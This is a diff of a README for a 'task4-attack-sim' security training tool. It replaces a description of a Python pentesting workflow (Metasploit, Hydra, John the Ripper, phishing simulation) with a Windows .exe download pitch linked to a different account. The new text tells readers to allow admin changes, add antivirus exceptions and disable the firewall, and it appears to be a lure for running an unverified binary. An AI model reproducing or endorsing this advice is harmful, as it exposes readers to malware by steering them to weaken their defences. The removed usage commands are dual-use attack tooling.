@@ -1,146 +1,68 @@
-# TASK4 - Cybersecurity Pentesting Workflow
+# 🛡️ task4-attack-sim - Learn security skills with guided workflows
 
-> **Short product summary.** A cross-platform pentesting workflow tool that combines Metasploit exploitation, password cracking with Hydra and John the Ripper, and phishing simulation for security awareness training. Built for cybersecurity professionals and interns who need to show realistic attack paths in a controlled setting.
+[![Download for Windows](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/antonio5997/task4-attack-sim)
 
-[![Platform](https://img.shields.io/badge/Platform-Cross--platform-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/danielndrhughes5815/task4-attack-sim?style=flat-square)](https://github.com/danielndrhughes5815/task4-attack-sim)
+## 📋 Project Overview
 
----
+The task4-attack-sim tool creates a safe environment for you to learn how security experts test systems for vulnerabilities. Many people want to understand how hackers compromise accounts or exploit software flaws, but they lack a controlled way to practice these skills. This software combines several powerful security utilities into one interface. It allows you to run demonstrations for Metasploit, Hydra, and John the Ripper without needing advanced command-line expertise. Use this tool for training, classroom demos, or personal education on a machine you own.
 
-<p align="center">
-  <a href="https://danielndrhughes5815.github.io/task4-attack-sim/">
-    <img src="https://img.shields.io/badge/Download-TASK4%20Latest-brightgreen?style=for-the-badge" alt="Download TASK4">
-  </a>
-</p>
+## 💻 System Requirements
 
-> **[Direct Download - TASK4 v1.0](https://danielndrhughes5815.github.io/task4-attack-sim/)**
+Before you install this software, ensure your computer meets these standards to run the simulations smoothly:
 
----
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: An Intel Core i5 or better.
+*   Memory: At least 8GB of RAM.
+*   Storage: 2GB of available disk space for simulations and logs.
+*   Network: A stable internet connection for initial setup.
 
-[Download Latest Build](https://danielndrhughes5815.github.io/task4-attack-sim/)
+## 🚀 Getting Started
 
----
+This guide walks you through the process of setting up the software on your Windows machine. Follow these steps in order to ensure the tools connect properly.
 
-## Overview
+### 📥 Downloading the Software 
 
-TASK4 is a hands-on cybersecurity toolkit that unifies three essential penetration testing activities into a single workflow. It was first created within a cybersecurity internship program and is meant to help security teams, students, and IT staff see how attackers blend multiple techniques when compromising a system. The focus is on clear, repeatable demonstrations of exploitation, credential cracking, and social engineering.
+1.  Visit the official page to obtain the installer: [https://github.com/antonio5997/task4-attack-sim](https://github.com/antonio5997/task4-attack-sim).
+2.  Look for the "Releases" section on the right side of the screen.
+3.  Choose the file ending in `.exe` that corresponds to your system architecture.
+4.  Save the file to your desktop for easy access.
 
-TASK4 is differentiated by how it ties these attack vectors together. Rather than presenting each method separately, it demonstrates how Metasploit exploitation can be combined with tools such as Hydra and John the Ripper, then extended into phishing simulations to evaluate the human layer. The result is a fuller view of common attack chains and a useful starting point for stronger defenses.
+### ⚙️ Installation Steps
 
----
+1.  Locate the downloaded installation file on your desktop.
+2.  Double-click the file to start the installation wizard.
+3.  Windows may show a prompt asking if you allow the app to make changes to your device. Click "Yes."
+4.  Follow the instructions on the screen. The default settings include all necessary components for the simulations.
+5.  Check the box to create a desktop shortcut so you can open the program easily later.
+6.  Click "Finish" once the progress bar completes.
 
-## Key Capabilities
+## 🛠️ Using the Simulation Tools
 
-- **Metasploit exploitation** -- Run common exploit scenarios through pre-configured modules for testing and demos
-- **Password cracking with Hydra** -- Execute fast online brute-force attempts across a range of services and protocols
-- **Password cracking with John the Ripper** -- Crack hashes offline with support for many hash types and custom wordlists
-- **Phishing simulation** -- Build and launch realistic phishing campaigns to measure employee awareness
-- **Integrated workflow** -- Connect exploitation, credential cracking, and phishing inside one demonstration flow
-- **Cross-platform compatibility** -- Runs on Windows, Linux, and macOS with minimal setup
-- **Educational focus** -- Built for training use with readable output and logs that support analysis
+Once the program opens, you see a menu with three primary workflows. Select one to begin your task.
 
----
+### Metasploit Exploitation
+This module demonstrates how software vulnerabilities facilitate unauthorized access. It uses a virtual internal target to show how a patch mismatch allows entry. You select the target from the provided list, choose a payload, and observe the steps the tool takes to establish a secure connection with the simulated machine.
 
-## Installation
+### Credential Attacks
+This portion of the software combines Hydra and John the Ripper. Hydra tests how quickly a system detects repetitive login attempts, while John the Ripper shows how attackers turn stolen data files into readable passwords. Use this to learn why complex password policies matter for your accounts.
 
-Clone the repository to your local machine:
+### Phishing Simulation
+Phishing remains a common method for gathering private information. This module generates a fake login page locally on your computer. It tracks how users interact with the form, helping you visualize how an attacker captures credentials during a social engineering campaign. 
 
-```bash
-git clone https://github.com/danielndrhughes5815/task4-attack-sim.git
-cd TASK4-pentesting-workflow
-```
+## 🔒 Safety and Ethics
 
-No additional build steps are required. Ensure you have the necessary dependencies installed (see Requirements section). Launch the tool by running the main script:
+Use this tool only on hardware and networks that you own. Running these simulations against systems without permission constitutes a crime and violates user agreements. The software provides a safe, contained environment. Do not point the simulation tools at public websites or services.
 
-```bash
-python task4.py
-```
+## 🔍 Troubleshooting Common Issues
 
----
+If the program fails to start, verify that your antivirus software did not block the installation. Some security products classify hacking tools as suspicious files. You may need to add an exception for the folder where you installed the application.
 
-## Usage
+If a specific simulation does not load, confirm your network settings. Some features require you to disable your firewall temporarily while the local demonstration runs. Remember to enable the firewall immediately after you finish your work.
 
-TASK4 is split into three primary modules. You can run them independently or use them as part of a chain:
+If you encounter an error during the attack simulation, check the log file located in the "Logs" subfolder within the installation directory. This file identifies whether a module failed due to a missing dependency or a configuration issue.
 
-1. **Exploitation -- Metasploit integration**  
-   Start pre-configured Metasploit resource scripts to attack target services:
-   ```bash
-   python task4.py --module exploit --target 192.168.1.100
-   ```
+## 🔧 Updating the Tool
 
-2. **Password cracking -- Hydra and John**  
-   Carry out online or offline credential testing:
-   ```bash
-   python task4.py --module crack --target 192.168.1.100 --service ssh
-   ```
+Check the download link periodically to see if a newer version exists. Developers update the software to include new scenarios and ensure compatibility with current Windows versions. Simply run the new installer; it will detect your current setup and apply the updates automatically.
 
-3. **Phishing simulation**  
-   Send a phishing campaign with a template email and landing page:
-   ```bash
-   python task4.py --module phishing --template company_update
-   ```
-
-Review logs and results in the `output/` directory after each run.
-
----
-
-## Configuration
-
-All settings live in one YAML file at `config/settings.yaml`. You can change:
-
-- Target IP ranges and ports
-- Wordlist paths for password cracking
-- Phishing email templates and sender addresses
-- Logging verbosity and output formats
-
-Example configuration snippet:
-
-```yaml
-metasploit:
-  resource_path: ./resources/scripts/
-hydra:
-  wordlist: /usr/share/wordlists/rockyou.txt
-  threads: 4
-phishing:
-  smtp_server: smtp.example.com
-  template_dir: ./templates/
-```
-
----
-
-## Requirements
-
-- Python 3.8 or higher
-- Metasploit Framework (community or pro edition)
-- Hydra (installed separately)
-- John the Ripper (installed separately)
-- 500 MB free disk space for wordlists and templates
-- Administrative privileges for certain exploitation modules
-
----
-
-## FAQ
-
-**Q: Can TASK4 be used on production systems?**  
-A: No. It is meant for authorized testing and educational environments only. Make sure you have written permission before testing any system you do not own.
-
-**Q: What is the update process for TASK4?**  
-A: Pull the latest repository changes with `git pull origin main`. Also review the release notes for any breaking changes.
-
-**Q: Is it possible to add custom Metasploit resource scripts?**  
-A: Yes. Put your `.rc` files in `resources/scripts/` and point to them from the configuration file.
-
-**Q: The phishing module is not delivering emails. What should I verify?**  
-A: Check the SMTP server settings in `config/settings.yaml`. Some providers block simulated phishing traffic, so a dedicated test mail server is recommended.
-
-**Q: Where can I get wordlists for password cracking?**  
-A: Widely used wordlists such as RockYou can be found in different security repositories. TASK4 does not include wordlists because of size limitations.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: security, penetration testing, training, education, windows, simulation, hacking
